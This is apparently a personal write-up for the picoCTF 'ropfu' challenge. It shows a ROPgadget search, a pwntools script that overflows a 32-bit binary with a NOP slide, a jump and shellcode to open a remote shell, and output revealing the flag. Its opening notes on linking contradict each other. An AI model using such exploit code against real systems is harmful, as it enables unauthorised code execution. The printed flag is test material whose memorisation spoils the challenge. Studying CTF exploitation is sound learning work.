[https://medium.com/@valsamaramalamatenia/picoctf-ropfu-beginners-guide-eb7af08567b5](https://medium.com/@valsamaramalamatenia/picoctf-ropfu-beginners-guide-eb7af08567b5)
Refer this writeup
Canary found, hence statically linked
Vuln is not statically linked
```bash
ROPgadget --binary executable_name | grep "jmp eax"
```

We can see that the command “jmp eax” exists at address 0x0805333b, so we will overwrite EIP’s value with this address. By doing so, the program counter will jump to EAX and execute the code it points to — since it points to our input, our code will be executed.

We want to get code execution on the remote server and in order to do that we have to use some shellcode. The most convenient way to do this is to use the corresponding method from the pwn tools.

We fill 26 bytes with NOPs (they are commands that do nothing and their bytecode is \x90), followed by a jump-short command (\xeb\x04). We then write the EIP register with the address of the “jmp eax” command.

We entered 26 NOPs as a NOP slide. Then we have a jump-short command. This is done in order to jump over the return address that we overwrote before. This is due to the fact that if we don’t jump over this address, then the bytes from which it consists are going to be interpreted as code and are going to get executed, leading to unpredictable results. 

```python
import pwn
import sys
payload = b'\x90' * 26
payload += b'\xeb\x04'
payload += pwn.p32(0x0805333b)
payload += pwn.asm(pwn.shellcraft.i386.linux.sh())
with open("output.bin" , "wb") as file:
	file.write(payload)

p = pwn.remote('saturn.picoctf.net',60590)
p.sendline(payload)
p.interactive()
```
  
we want the command to return a shell; we achieve this with pwn.asm(pwn.shellcraft.i386.linux.sh()) (this is the bytecode to give us a shell, and the pwn library helps with it)

![[ROPFU1.png]]
![[ROPFU2.png]]

run the script
```bash
[+] Opening connection to saturn.picoctf.net on port 61033: Done
[*] Switching to interactive mode
How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!
$ ls
flag.txt
vuln
$ cat flag.txt
picoCTF{5n47ch_7h3_5h311_4c812975}$  
```

**FLAG - `picoCTF{5n47ch_7h3_5h311_4c812975}`**

